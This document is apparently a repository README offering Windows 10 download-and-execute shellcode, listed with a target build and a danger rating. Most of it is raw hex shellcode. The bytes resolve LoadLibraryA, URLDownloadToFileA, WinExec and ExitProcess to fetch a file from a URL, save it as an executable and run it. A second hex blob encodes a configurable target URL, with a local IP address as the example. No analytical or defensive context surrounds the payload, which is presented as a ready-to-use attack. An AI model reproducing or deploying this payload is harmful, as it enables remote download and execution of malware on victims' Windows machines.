# ALNX-1002-DUNEX-Exploit
WinAllocation from URL, WinExecute File(p) and ExitProcess Exploit

```yaml
TargetOS: Win10
TestedOn: 2004 SO 19041.685
Payload: ASM
Language: C++ / Shellcode-Hex / Assembly
Patch: n/a
Danger: 7
Classification: ALNX-1001-CMSTP
```

**_ZombiePayload (unchanged/default)_** 
```sh
\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B
\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53
\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72
\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81
\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04
\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64
\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3
\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3
\x8B\x14\x8E\x03\xD3\x33\xC9\x51\x68\x2E
\x65\x78\x65\x68\x64\x65\x61\x64\x53\x52
\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62
\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2
\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C
\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C
\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24
\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33
\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64
\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C
\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24
\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83
\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68
\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57
\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D
\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A
\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03
\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69
\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF
\xFF\xFF
```
**_PayloadCfg (url/target)_** - example: http://192.168.0.1/file.txt
```sh
\x68\x74\x74\x70\x3A\x2F\x2F\x31
\x39\x32\x2E\x31\x36\x38\x2E\x30\x2E\x31
\x2F\x66\x69\x6C\x65\x2E\x74\x78\x74```

**_Shell encoding: RevHex_**
